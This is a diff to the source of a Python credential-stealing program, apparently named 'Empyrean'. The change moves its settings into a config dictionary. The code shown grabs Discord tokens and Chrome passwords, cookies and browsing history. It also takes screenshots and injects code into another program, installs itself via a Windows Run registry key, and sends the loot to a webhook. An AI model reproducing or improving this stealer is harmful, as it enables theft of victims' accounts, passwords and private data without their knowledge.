@@ -20,12 +20,22 @@ from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
 
-def main(webhook: str) -> None: 
-    debug()
+def main() -> None: 
+    config = {
+        "webhook": "WEBHOOK_URL",
+        "debug": True,
+        "startup": True,
+        "google": True,
+        "screenshot": True,
+        "inject": True,
+    }
+    webhook = config['webhook']
+    
+    debug() if config["debug"] else None
     cleanup()
         
-    startup()
-    injection(webhook=webhook)
+    startup() if config["startup"] else None
+    injection(webhook=webhook) if config["inject"] else None
     
     webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
     embed = Embed(title="\u200b", color=0x000000)
@@ -33,11 +43,12 @@ def main(webhook: str) -> None:
     token_grabber(embed=embed)
     embed.add_field(name="**System Info**", value=f"```{systemspec.sys_spec()}```")
     
-    google().grabPasswords()
-    google().grabCookies()
-    google().grabSearchHistory()
-    google().grabWebHistory()
-    image()
+    if config["google"]:
+        google().grabPasswords()
+        google().grabCookies()
+        google().grabSearchHistory()
+        google().grabWebHistory()
+    image() if config["screenshot"] else None
     
     files = []
     files.append(File(".\\chrome-passwords.txt") if os.path.exists(".\\chrome-passwords.txt") else None)
@@ -799,7 +810,7 @@ class startup():
         subprocess.call(["reg", "add", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Empyrean", "/t", "REG_SZ", "/d", self.Empyrean_dir + "\\" + os.path.basename(__file__)], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 if __name__ == "__main__":
-    main("WEBHOOK_URL")    
+    main()    
     
     # except Exception as e:
     #     print(e)
